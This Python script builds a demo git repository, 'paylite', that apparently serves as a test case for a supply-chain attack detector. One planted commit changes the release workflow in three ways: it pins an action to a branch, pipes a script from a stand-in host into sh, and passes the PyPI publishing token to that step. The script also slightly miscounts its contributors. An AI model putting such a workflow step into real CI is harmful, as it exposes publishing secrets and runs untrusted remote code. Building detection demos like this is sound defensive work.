#!/usr/bin/env python3
"""Build the SupplyTrace demonstration repository: 'paylite'.

`paylite` is a small, plausible payment-checkout service with fifteen commits by
seven contributors over three months. Somewhere in that history is a software
supply chain attack. It is not marked, not at HEAD, and there are four commits
after it.

The point of the demo is that the attack is not obvious by reading the log --
several commits legitimately touch CI workflows, and several legitimately touch
dependency files. Exactly one commit touches both at once.

The build is **deterministic**: identities, timestamps and file contents are
fixed, so every run produces the same commit SHAs on any machine.

Usage::

    python examples/build_demo.py
    python examples/build_demo.py --target ~/paylite
"""

from __future__ import annotations

import argparse
import os
import shutil
import subprocess
from pathlib import Path

HERE = Path(__file__).resolve().parent
DEFAULT_TARGET = HERE / "paylite"

PEOPLE = {
    "priya": ("Priya Raman", "priya.raman@paylite.io"),
    "tom": ("Tom Bergstrom", "tom.bergstrom@paylite.io"),
    "wei": ("Wei Zhang", "wei.zhang@paylite.io"),
    "sofia": ("Sofia Marino", "sofia.marino@paylite.io"),
    "daniel": ("Daniel Osei", "daniel.osei@paylite.io"),
    # A drive-by contributor. Not on the company domain.
    "kaito": ("kaito-dev", "kaito.dev.builds@fastmail-mx.com"),
}

TOKEN_MIN_LENGTH = 32

TOKENS_V1 = """import hmac
import time

TOKEN_MIN_LENGTH = 32
TOKEN_MAX_AGE_SECONDS = 3600


def valid_token(token, secret):
    if not token or len(token) < TOKEN_MIN_LENGTH:
        return False
    return hmac.compare_digest(token[:TOKEN_MIN_LENGTH], secret[:TOKEN_MIN_LENGTH])


def token_expired(issued_at, now=None):
    now = time.time() if now is None else now
    return (now - issued_at) > TOKEN_MAX_AGE_SECONDS


def normalise(token):
    return token.strip() if token else ""


def describe(token):
    if not token:
        return "empty token"
    return "token of length {}".format(len(token))
"""

TOKENS_V2 = TOKENS_V1 + (
    "\n\ndef token_prefix(token):\n"
    '    return token[:8] if token else ""\n'
)

CI_WORKFLOW_V1 = """name: CI
on:
  push:
    branches: [main]
  pull_request:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: pip install -r requirements.txt
      - run: pytest -q
"""

CI_WORKFLOW_V2 = """name: CI
on:
  push:
    branches: [main]
  pull_request:
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ['3.11', '3.12', '3.13']
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
      - run: pip install -r requirements.txt
      - run: pytest -q
"""

RELEASE_WORKFLOW_V1 = """name: Release
on:
  push:
    tags: ['v*']
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: pip install build
      - run: python -m build
      - name: Publish package
        env:
          PYPI_TOKEN: ${{ secrets.PYPI_TOKEN }}
        run: python -m twine upload dist/*
"""

# The attack. Three changes, each individually arguable, together not:
#   1. a build action pinned to a BRANCH, so its code can change with no commit
#      in this repository;
#   2. a remote script piped into a shell during the release job;
#   3. the release job's secret is now passed to that step's environment.
RELEASE_WORKFLOW_V2 = """name: Release
on:
  push:
    tags: ['v*']
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - uses: ci-helpers/turbo-cache@main
        with:
          key: paylite-build
      - name: Warm build cache
        env:
          CACHE_TOKEN: ${{ secrets.PYPI_TOKEN }}
        run: curl -sSL https://cdn.turbo-cache.example.invalid/warm.sh | sh
      - run: pip install build
      - run: python -m build
      - name: Publish package
        env:
          PYPI_TOKEN: ${{ secrets.PYPI_TOKEN }}
        run: python -m twine upload dist/*
"""


class DemoBuilder:
    def __init__(self, target: Path) -> None:
        self.target = target
        self.log: list[tuple[str, str, str, str]] = []

    def _env(self, who: str, when: str) -> dict[str, str]:
        name, email = PEOPLE[who]
        env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
        env.update({
            "GIT_CONFIG_NOSYSTEM": "1",
            "GIT_CONFIG_GLOBAL": os.devnull,
            "GIT_TERMINAL_PROMPT": "0",
            "GIT_AUTHOR_NAME": name, "GIT_AUTHOR_EMAIL": email,
            "GIT_COMMITTER_NAME": name, "GIT_COMMITTER_EMAIL": email,
            "GIT_AUTHOR_DATE": when, "GIT_COMMITTER_DATE": when,
            "LC_ALL": "C.UTF-8",
        })
        return env

    def git(self, *args: str, who: str = "priya", when: str = "2026-01-01T00:00:00+00:00") -> str:
        out = subprocess.run(["git", *args], cwd=self.target, env=self._env(who, when),
                             capture_output=True, check=True)
        return out.stdout.decode("utf-8", errors="replace")

    def write(self, relative: str, content: str | bytes) -> None:
        path = self.target / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            path.write_bytes(content)
        else:
            path.write_text(content, encoding="utf-8")

    def commit(self, message: str, who: str, when: str) -> str:
        self.git("add", "-A", who=who, when=when)
        self.git("commit", "-q", "-m", message, who=who, when=when)
        sha = self.git("rev-parse", "HEAD").strip()
        self.log.append((sha, PEOPLE[who][0], when[:10], message))
        return sha

    def build(self) -> list[tuple[str, str, str, str]]:
        if self.target.exists():
            shutil.rmtree(self.target)
        self.target.mkdir(parents=True)
        self.git("init", "-q", "-b", "main", ".")

        # 1 -- project skeleton
        self.write("README.md",
                   "# paylite\n\nA small payment checkout service.\n\n"
                   "## Development\n\n    pip install -r requirements.txt\n    pytest\n")
        self.write(".gitignore", "__pycache__/\n*.pyc\ndist/\n")
        self.write("src/paylite/__init__.py", '__version__ = "0.1.0"\n')
        self.write("src/paylite/checkout.py",
                   "from decimal import Decimal\n\n\n"
                   "def start_checkout(cart):\n"
                   "    total = sum(Decimal(str(i[\"price\"])) for i in cart)\n"
                   "    return {\"total\": total, \"currency\": \"EUR\"}\n")
        self.write("requirements.txt", "requests==2.31.0\n")
        self.commit("Initial project skeleton", "priya", "2026-01-08T10:20:00+00:00")

        # 2 -- payment client
        self.write("src/paylite/payments.py",
                   "import requests\n\n"
                   "PROVIDER_URL = \"https://api.provider.example/v1/charge\"\n\n\n"
                   "def charge(amount, currency, token):\n"
                   "    response = requests.post(\n"
                   "        PROVIDER_URL,\n"
                   "        json={\"amount\": str(amount), \"currency\": currency},\n"
                   "        headers={\"Authorization\": f\"Bearer {token}\"},\n"
                   "        timeout=10,\n"
                   "    )\n"
                   "    return response.json()\n")
        self.write("tests/test_payments.py",
                   "from paylite import payments\n\n\n"
                   "def test_provider_url_is_https():\n"
                   "    assert payments.PROVIDER_URL.startswith(\"https://\")\n")
        self.commit("Add payment provider client", "tom", "2026-01-12T15:45:00+00:00")

        # 3 -- CI workflow  (workflow touchpoint, no dependency change)
        self.write(".github/workflows/ci.yml", CI_WORKFLOW_V1)
        self.commit("Add CI workflow", "priya", "2026-01-15T09:30:00+00:00")

        # 4 -- token validation
        self.write("src/paylite/tokens.py", TOKENS_V1)
        self.write("tests/test_tokens.py",
                   "from paylite.tokens import valid_token\n\n\n"
                   "def test_short_token_rejected():\n"
                   "    assert valid_token(\"abc\", \"x\" * 32) is False\n")
        self.commit("Add token validation", "wei", "2026-01-21T11:05:00+00:00")

        # 5 -- Node tooling  (dependency touchpoint, no workflow change)
        self.write("package.json",
                   '{\n  "name": "paylite-docs",\n  "version": "0.1.0",\n'
                   '  "devDependencies": {\n'
                   '    "markdownlint-cli": "0.39.0",\n'
                   '    "http-server": "14.1.1"\n  }\n}\n')
        self.write("package-lock.json",
                   '{\n  "lockfileVersion": 3,\n  "packages": {\n'
                   '    "node_modules/markdownlint-cli": { "version": "0.39.0" },\n'
                   '    "node_modules/http-server": { "version": "14.1.1" }\n  }\n}\n')
        self.write("docs/index.md", "# paylite docs\n\nGetting started.\n")
        self.commit("Add Node tooling for the docs site", "sofia", "2026-01-28T13:15:00+00:00")

        # 6 -- declined payments
        self.write("src/paylite/payments.py",
                   "import requests\n\n"
                   "PROVIDER_URL = \"https://api.provider.example/v1/charge\"\n\n\n"
                   "class PaymentDeclined(Exception):\n"
                   "    pass\n\n\n"
                   "def charge(amount, currency, token):\n"
                   "    response = requests.post(\n"
                   "        PROVIDER_URL,\n"
                   "        json={\"amount\": str(amount), \"currency\": currency},\n"
                   "        headers={\"Authorization\": f\"Bearer {token}\"},\n"
                   "        timeout=10,\n"
                   "    )\n"
                   "    payload = response.json()\n"
                   "    if payload.get(\"status\") == \"declined\":\n"
                   "        raise PaymentDeclined(payload.get(\"reason\", \"unknown\"))\n"
                   "    return payload\n")
        self.write("tests/test_payments.py",
                   "import pytest\n\n"
                   "from paylite import payments\n\n\n"
                   "def test_provider_url_is_https():\n"
                   "    assert payments.PROVIDER_URL.startswith(\"https://\")\n\n\n"
                   "def test_declined_exception_exists():\n"
                   "    assert issubclass(payments.PaymentDeclined, Exception)\n")
        self.commit("Handle declined payments", "tom", "2026-02-03T16:40:00+00:00")

        # 7 -- release workflow  (workflow touchpoint)
        self.write(".github/workflows/release.yml", RELEASE_WORKFLOW_V1)
        self.commit("Add release workflow", "priya", "2026-02-09T10:00:00+00:00")

        # 8 -- config module
        self.write("src/paylite/config.py",
                   "import os\n\n\n"
                   "def provider_url():\n"
                   "    return os.environ.get(\"PAYLITE_PROVIDER_URL\", "
                   "\"https://api.provider.example/v1/charge\")\n\n\n"
                   "def timeout_seconds():\n"
                   "    return int(os.environ.get(\"PAYLITE_TIMEOUT\", \"10\"))\n")
        self.commit("Extract configuration into its own module", "wei",
                    "2026-02-14T14:25:00+00:00")

        # 9 + 10 -- refunds on a branch, merged
        self.git("checkout", "-q", "-b", "feature/refunds")
        self.write("src/paylite/refunds.py",
                   "from paylite.payments import PaymentDeclined\n\n\n"
                   "def refund(charge_id, amount):\n"
                   "    if amount <= 0:\n"
                   "        raise ValueError(\"refund amount must be positive\")\n"
                   "    return {\"charge_id\": charge_id, \"refunded\": amount}\n")
        self.write("tests/test_refunds.py",
                   "import pytest\n\n"
                   "from paylite.refunds import refund\n\n\n"
                   "def test_negative_refund_rejected():\n"
                   "    with pytest.raises(ValueError):\n"
                   "        refund(\"ch_1\", -5)\n")
        self.commit("Add refund support", "daniel", "2026-02-18T12:10:00+00:00")
        self.git("checkout", "-q", "main")
        self.git("merge", "-q", "--no-ff", "feature/refunds", "-m", "Merge refund support",
                 who="priya", when="2026-02-20T09:50:00+00:00")
        sha = self.git("rev-parse", "HEAD").strip()
        self.log.append((sha, PEOPLE["priya"][0], "2026-02-20", "Merge refund support"))

        # 11 -- THE ATTACK. Workflow + lockfile, in one commit, at 03:14.
        self.write(".github/workflows/release.yml", RELEASE_WORKFLOW_V2)
        self.write("package-lock.json",
                   '{\n  "lockfileVersion": 3,\n  "packages": {\n'
                   '    "node_modules/markdownlint-cli": { "version": "0.39.0" },\n'
                   '    "node_modules/http-server": { "version": "14.1.1" },\n'
                   '    "node_modules/turbo-cache-helper": { "version": "1.0.2" }\n  }\n}\n')
        self.commit("Speed up release builds with a caching step", "kaito",
                    "2026-02-24T03:14:00+00:00")

        # 12 -- docs noise
        self.write("docs/index.md",
                   "# paylite docs\n\nGetting started.\n\n## Refunds\n\n"
                   "Refunds are issued through `paylite.refunds.refund`.\n")
        self.write("README.md",
                   "# paylite\n\nA small payment checkout service.\n\n"
                   "## Development\n\n    pip install -r requirements.txt\n    pytest\n\n"
                   "## Documentation\n\nSee `docs/`.\n")
        self.commit("Document refund flow", "sofia", "2026-02-27T11:35:00+00:00")

        # 13 -- rename (rename detection / confidence demo)
        self.git("mv", "src/paylite/tokens.py", "src/paylite/auth_tokens.py")
        self.write("src/paylite/auth_tokens.py", TOKENS_V2)
        self.write("tests/test_tokens.py",
                   "from paylite.auth_tokens import valid_token\n\n\n"
                   "def test_short_token_rejected():\n"
                   "    assert valid_token(\"abc\", \"x\" * 32) is False\n")
        self.commit("Rename tokens module to auth_tokens", "wei", "2026-03-04T15:20:00+00:00")

        # 14 -- dependency bump  (dependency touchpoint, no workflow change)
        self.write("requirements.txt", "requests==2.32.3\ntenacity==8.2.3\n")
        self.write("src/paylite/payments.py",
                   "import requests\n"
                   "from tenacity import retry, stop_after_attempt\n\n"
                   "PROVIDER_URL = \"https://api.provider.example/v1/charge\"\n\n\n"
                   "class PaymentDeclined(Exception):\n"
                   "    pass\n\n\n"
                   "@retry(stop=stop_after_attempt(3))\n"
                   "def charge(amount, currency, token):\n"
                   "    response = requests.post(\n"
                   "        PROVIDER_URL,\n"
                   "        json={\"amount\": str(amount), \"currency\": currency},\n"
                   "        headers={\"Authorization\": f\"Bearer {token}\"},\n"
                   "        timeout=10,\n"
                   "    )\n"
                   "    payload = response.json()\n"
                   "    if payload.get(\"status\") == \"declined\":\n"
                   "        raise PaymentDeclined(payload.get(\"reason\", \"unknown\"))\n"
                   "    return payload\n")
        self.commit("Bump requests and add retry on charge", "tom",
                    "2026-03-09T10:15:00+00:00")

        # 15 -- legitimate CI change  (workflow touchpoint, after the attack)
        self.write(".github/workflows/ci.yml", CI_WORKFLOW_V2)
        self.commit("Test against Python 3.12 and 3.13", "priya", "2026-03-12T09:05:00+00:00")

        self.git("tag", "-a", "v0.2.0", "-m", "Release 0.2.0",
                 who="priya", when="2026-03-13T09:00:00+00:00")
        return self.log


def main() -> int:
    parser = argparse.ArgumentParser(description="Build the paylite demo repository.")
    parser.add_argument("--target", default=str(DEFAULT_TARGET))
    args = parser.parse_args()

    target = Path(args.target).expanduser().resolve()
    log = DemoBuilder(target).build()

    print(f"Built 'paylite' at: {target}")
    print(f"{len(log)} commits, {len(PEOPLE)} contributors, Jan-Mar 2026.\n")
    for sha, who, when, message in log:
        print(f"  {sha[:12]}  {when}  {who:14}  {message}")

    print("\n(One of these commits contains a supply chain attack.)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
